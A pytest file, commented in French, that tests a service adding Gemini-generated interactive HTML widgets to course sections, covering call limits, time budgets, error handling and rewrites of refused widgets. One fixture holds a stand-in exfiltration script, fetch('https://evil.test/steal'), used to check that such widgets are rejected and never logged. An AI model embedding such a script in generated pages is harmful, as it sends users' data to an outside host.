"""Widgets générés à part des sections, un appel Gemini par section (`app.services.course_widgets`)."""

import re
from unittest.mock import AsyncMock

import pytest

from app.api.schemas import ApiContentBlock, ApiPlannedSection, CourseGenerationResponse
from app.core.config import Settings
from app.core.exceptions import GeminiQuotaExceededError, GeminiUnavailableError
from app.schemas.course_generation import (
    COURSE_GENERATION_GEMINI_SCHEMA,
    Section,
    SectionsBatchSchema,
    SectionWidgetResult,
)
from app.services import course_widgets
from app.services.course_generator import _map_sections_to_course_sections
from app.services.course_plan_generator import _incomplete_section, generate_course_from_validated_plan
from app.services.course_widgets import attach_widgets
from tests.test_course_plan_generator import _api_sections, _dev_section, _plan_row, _wrap_up_structured

_HTML = "<div style='color:var(--w-fg)'><button aria-label='Go'>Go</button></div><script>1+1</script>"


def _item(**overrides) -> dict:
    base = {"title": "Widget", "description": "Un visuel interactif.", "html": _HTML}
    return {"widget": {**base, **overrides}}


_NO_WIDGET = {"widget": None}
_FORBIDDEN = {"html": "<p>x</p><script>fetch('https://evil.test/steal')</script>"}


def _response() -> CourseGenerationResponse:
    """Introduction, deux sections rédigées (Alpha, Gamma) et une section de repli (Beta)."""
    introduction = Section.model_validate({
        "type": "introduction", "title": "Introduction", "blocks": [{"type": "text", "text": "intro"}], "subsections": [],
    })
    sections = [
        introduction,
        Section.model_validate(_dev_section("Alpha")),
        _incomplete_section(ApiPlannedSection(type="development", title="Beta", order=3)),
        Section.model_validate(_dev_section("Gamma")),
    ]
    return CourseGenerationResponse(
        mode="question_only", format="full_course", sources=[], introduction={},
        meta={"title": "Widgets", "subject": "Algorithmique", "generated_at": "2026-10-12T10:00:00Z"},
        sections=_map_sections_to_course_sections(sections), summary="résumé",
    )


def _settings(**overrides) -> Settings:
    return Settings(gemini_api_key="k", course_widgets_enabled=True, **overrides)


def _gemini(*outcomes: dict | Exception) -> AsyncMock:
    """Un résultat par appel, dans l'ordre (le dernier se répète)."""
    gemini = AsyncMock()
    gemini.is_degraded.return_value = False
    gemini.format_structured.side_effect = list(outcomes) + [outcomes[-1]] * 20
    return gemini


def _prompts(gemini: AsyncMock) -> list[str]:
    return [call.kwargs["raw_answer"] for call in gemini.format_structured.await_args_list]


def _widget_blocks(response: CourseGenerationResponse) -> dict[str, list[str]]:
    """`{titre de section: [sous-section portant un widget, ...]}`."""
    found: dict[str, list[str]] = {}
    for section in response.sections:
        for sub in section.subsections:
            if any(block.type == "widget" for block in sub.blocks):
                found.setdefault(section.title, []).append(sub.title)
    return found


def _comment(result: CourseGenerationResponse, index: int):
    return next(sub for sub in result.sections[index].subsections if sub.title == "Comment")


@pytest.mark.asyncio
async def test_one_call_per_eligible_section_in_order_and_widget_in_comment_subsection():
    gemini = _gemini(_item(title="Widget d'Alpha"), _item(title="Widget de Gamma"))

    result = await attach_widgets(_response(), settings=_settings(), gemini_client=gemini)

    assert _widget_blocks(result) == {"Alpha": ["Comment"], "Gamma": ["Comment"]}
    assert _comment(result, 1).blocks[-1].widget.title == "Widget d'Alpha"
    assert _comment(result, 3).blocks[-1].widget.html == _HTML
    assert gemini.format_structured.await_count == 2  # ni l'introduction, ni la section de repli
    prompts = _prompts(gemini)
    assert "Section à illustrer : Alpha" in prompts[0] and "Section à illustrer : Gamma" in prompts[1]
    for call in gemini.format_structured.await_args_list:
        assert call.kwargs["response_schema"] is SectionWidgetResult


@pytest.mark.asyncio
async def test_widgets_chain_is_passed_to_gemini():
    gemini = _gemini(_NO_WIDGET)
    settings = _settings(gemini_chain_widgets=["m-widgets", "m-fallback"])

    await attach_widgets(_response(), settings=settings, gemini_client=gemini)

    assert all(c.kwargs["chain"] == ["m-widgets", "m-fallback"] for c in gemini.format_structured.await_args_list)
    default = _settings()
    assert default.gemini_chain_widgets == [default.gemini_model_flash, default.gemini_model_flash_lite]


@pytest.mark.asyncio
async def test_prompt_carries_full_section_text_bounded_and_states_the_contract():
    response = _response()
    _comment(response, 1).blocks.append(ApiContentBlock(type="text", text="MARQUEUR_FIN " + "z" * 9000))
    gemini = _gemini(_NO_WIDGET)

    await attach_widgets(response, settings=_settings(), gemini_client=gemini)

    prompt = _prompts(gemini)[0]
    system = gemini.format_structured.await_args_list[0].kwargs["system_instruction"]
    section_part = prompt.split("<section>\n")[1].split("\n</section>")[0]
    assert "## Pourquoi" in section_part and "## Comment" in section_part  # toutes les sous-sections
    assert len(section_part) <= 6000  # borné
    assert "DONNÉE" in system and "n'exécute jamais" in system
    for variable in ("--w-bg", "--w-fg", "--w-muted", "--w-accent", "--w-border", "--w-surface"):
        assert variable in prompt


@pytest.mark.asyncio
async def test_stops_at_widgets_max():
    gemini = _gemini(_item())

    result = await attach_widgets(_response(), settings=_settings(course_widgets_max=1), gemini_client=gemini)

    assert list(_widget_blocks(result)) == ["Alpha"]
    assert gemini.format_structured.await_count == 1


@pytest.mark.asyncio
async def test_stops_at_max_calls():
    gemini = _gemini(_NO_WIDGET)

    await attach_widgets(_response(), settings=_settings(course_widgets_max_calls=1), gemini_client=gemini)

    assert gemini.format_structured.await_count == 1


@pytest.mark.asyncio
async def test_stops_when_time_budget_is_exceeded(monkeypatch):
    clock = {"now": 0.0}
    monkeypatch.setattr(course_widgets.time, "monotonic", lambda: clock["now"])
    gemini = _gemini(_item())

    async def slow_call(**kwargs):
        clock["now"] += 100.0  # le premier appel consomme tout le budget
        return _item()

    gemini.format_structured.side_effect = slow_call

    result = await attach_widgets(
        _response(), settings=_settings(course_widgets_budget_seconds=50), gemini_client=gemini
    )

    assert gemini.format_structured.await_count == 1
    assert list(_widget_blocks(result)) == ["Alpha"]  # le widget obtenu est conservé


@pytest.mark.asyncio
async def test_model_may_answer_no_widget_and_next_sections_are_still_processed():
    gemini = _gemini(_NO_WIDGET, _item(title="Gamma"))

    result = await attach_widgets(_response(), settings=_settings(), gemini_client=gemini)

    assert _widget_blocks(result) == {"Gamma": ["Comment"]}
    assert gemini.format_structured.await_count == 2


@pytest.mark.asyncio
async def test_gemini_error_on_a_section_does_not_stop_the_next_ones():
    gemini = _gemini(GeminiUnavailableError("indisponible"), _item(title="Gamma"))

    result = await attach_widgets(_response(), settings=_settings(), gemini_client=gemini)

    assert _widget_blocks(result) == {"Gamma": ["Comment"]}
    assert gemini.format_structured.await_count == 2


@pytest.mark.asyncio
async def test_quota_exhausted_stops_without_exception():
    gemini = _gemini(GeminiQuotaExceededError("quota"), _item())

    result = await attach_widgets(_response(), settings=_settings(), gemini_client=gemini)

    assert _widget_blocks(result) == {}
    assert gemini.format_structured.await_count == 1


@pytest.mark.asyncio
async def test_refused_widget_is_rewritten_once_with_the_reason(caplog):
    gemini = _gemini(_item(**_FORBIDDEN), _item(title="Réécrit"), _NO_WIDGET)

    with caplog.at_level("INFO"):
        result = await attach_widgets(_response(), settings=_settings(), gemini_client=gemini)

    assert _widget_blocks(result) == {"Alpha": ["Comment"]}
    assert _comment(result, 1).blocks[-1].widget.title == "Réécrit"
    prompts = _prompts(gemini)
    assert "REFUSÉE" in prompts[1] and "Section à illustrer : Alpha" in prompts[1]
    assert "REFUSÉE" not in prompts[0] and "REFUSÉE" not in prompts[2]
    assert "evil.test" not in caplog.text and "steal" not in caplog.text  # le HTML n'est jamais journalisé
    assert "evil.test" not in prompts[1]
    assert "course_widget_dropped" in caplog.text


@pytest.mark.asyncio
async def test_widget_refused_twice_skips_the_section():
    gemini = _gemini(_item(**_FORBIDDEN), _item(**_FORBIDDEN), _item(title="Gamma"))

    result = await attach_widgets(_response(), settings=_settings(), gemini_client=gemini)

    assert _widget_blocks(result) == {"Gamma": ["Comment"]}
    assert gemini.format_structured.await_count == 3


@pytest.mark.asyncio
async def test_rewrite_counts_against_max_calls():
    gemini = _gemini(_item(**_FORBIDDEN), _item(title="inutile"))

    result = await attach_widgets(_response(), settings=_settings(course_widgets_max_calls=1), gemini_client=gemini)

    assert _widget_blocks(result) == {}
    assert gemini.format_structured.await_count == 1


@pytest.mark.asyncio
async def test_oversized_widget_is_refused_and_long_title_is_truncated():
    big = _item(html="<p>" + "x" * 300 + "</p>")
    gemini = _gemini(big, big, _item(title="T" * 300))

    result = await attach_widgets(_response(), settings=_settings(course_widget_max_chars=200), gemini_client=gemini)

    assert _widget_blocks(result) == {"Gamma": ["Comment"]}
    assert len(_comment(result, 3).blocks[-1].widget.title) == 120
    assert "limite de 200" in _prompts(gemini)[1]


@pytest.mark.asyncio
@pytest.mark.parametrize("settings", [
    Settings(gemini_api_key="k", course_widgets_enabled=False),
    Settings(gemini_api_key="k", course_widgets_enabled=True, course_widgets_max=0),
])
async def test_disabled_makes_no_gemini_call(settings):
    gemini = _gemini(_item())

    result = await attach_widgets(_response(), settings=settings, gemini_client=gemini)

    assert _widget_blocks(result) == {}
    gemini.format_structured.assert_not_awaited()


def test_settings_defaults(monkeypatch):
    monkeypatch.delenv("COURSE_WIDGETS_ENABLED")
    settings = Settings(gemini_api_key="k", _env_file=None)
    assert settings.course_widgets_enabled is True
    assert (settings.course_widgets_max, settings.course_widgets_max_calls) == (6, 9)
    assert (settings.course_widgets_budget_seconds, settings.course_widget_max_chars) == (150, 20000)


@pytest.mark.asyncio
async def test_degraded_gemini_or_course_without_written_section_makes_no_call():
    degraded = _gemini(_item())
    degraded.is_degraded.return_value = True
    await attach_widgets(_response(), settings=_settings(), gemini_client=degraded)
    degraded.format_structured.assert_not_awaited()

    empty = _response()
    empty.sections = empty.sections[:1]  # introduction seule
    gemini = _gemini(_item())
    await attach_widgets(empty, settings=_settings(), gemini_client=gemini)
    gemini.format_structured.assert_not_awaited()

    assert await attach_widgets(_response(), settings=_settings(), gemini_client=None)


@pytest.mark.asyncio
@pytest.mark.parametrize("outcome", [
    RuntimeError("inattendu"),
    {"widget": "pas un objet"},
    {"widget": {"title": "sans html"}},
])
async def test_failure_never_breaks_the_course(outcome):
    result = await attach_widgets(_response(), settings=_settings(), gemini_client=_gemini(outcome))

    assert _widget_blocks(result) == {}
    assert [s.title for s in result.sections] == ["Introduction", "Alpha", "Beta", "Gamma"]


@pytest.mark.asyncio
async def test_section_that_already_has_a_widget_is_not_offered_again():
    response = await attach_widgets(_response(), settings=_settings(), gemini_client=_gemini(_item()))
    gemini = _gemini(_NO_WIDGET)

    await attach_widgets(response, settings=_settings(), gemini_client=gemini)

    gemini.format_structured.assert_not_awaited()


def test_widget_block_is_not_offered_in_the_section_schema():
    assert "widget" not in str(COURSE_GENERATION_GEMINI_SCHEMA).lower()
    assert "widget" not in str(SectionsBatchSchema.model_json_schema()).lower()


# ─── Bout en bout : cours généré depuis un plan ────────────────


def _client(calls: list) -> AsyncMock:
    async def format_structured(raw_answer, system_instruction, *, response_schema=None, chain=None):
        calls.append(response_schema)
        if response_schema is SectionsBatchSchema:
            count = int(re.search(r"Génère exactement (\d+)", raw_answer).group(1))
            return {"sections": [_dev_section(f"brut-{i}") for i in range(count)]}
        if response_schema is SectionWidgetResult:
            return _item()
        assert response_schema is COURSE_GENERATION_GEMINI_SCHEMA
        return _wrap_up_structured()

    client = AsyncMock()
    client.is_degraded.return_value = False
    client.format_structured.side_effect = format_structured
    return client


@pytest.mark.asyncio
async def test_course_from_plan_gets_one_widget_call_per_section(approfondi_old_format):
    calls: list = []

    result = await generate_course_from_validated_plan(
        _plan_row(), _api_sections(["Alpha", "Beta"]), _client(calls), _settings(course_plan_batch_size=5)
    )

    assert _widget_blocks(result) == {"Alpha": ["Comment"], "Beta": ["Comment"]}
    assert calls.count(SectionWidgetResult) == 2 and calls[-1] is SectionWidgetResult  # après les sections


@pytest.mark.asyncio
async def test_course_from_plan_makes_no_extra_call_when_disabled(approfondi_old_format):
    calls: list = []

    result = await generate_course_from_validated_plan(
        _plan_row(), _api_sections(["Alpha", "Beta"]), _client(calls),
        Settings(gemini_api_key="k", course_widgets_enabled=False, course_plan_batch_size=5),
    )

    assert _widget_blocks(result) == {}
    assert SectionWidgetResult not in calls
